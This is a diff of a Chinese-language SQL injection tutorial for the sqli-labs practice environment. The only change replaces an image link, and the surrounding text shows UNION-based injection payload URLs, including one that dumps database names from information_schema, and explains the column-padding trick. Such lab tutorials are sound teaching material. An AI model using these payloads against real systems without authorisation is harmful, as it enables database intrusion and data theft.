@@ -14,7 +14,7 @@
     `http://192.168.3.148/Less-1/?id=1111%27%20union%20select%201,2,3%20--+`
 
     首先解释一下select后面几个数字的意思，1，2，3，4...，这里的几个数字纯粹是凑数的，凑够和union关键字前面的那个表的字段数一样，不然没法拼接成一个表。在sql注入的时候，在将相应位置替换成你想获得的数据，查询结果后面就会显示出来。如下图最后一行：  
-    ![xx](https://gss0.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/18d8bc3eb13533fad032f376a0d3fd1f40345be5.jpg)
+    ![xx](https://raw.githubusercontent.com/1120362990/Paper/master/images/paper-sqli-1.png)
 
 6. 然后利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息例子(这是一个查询数据库名信息的语句)：  
 `http://127.0.0.1/sqli-labs/Less-1/?id=861' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+`  
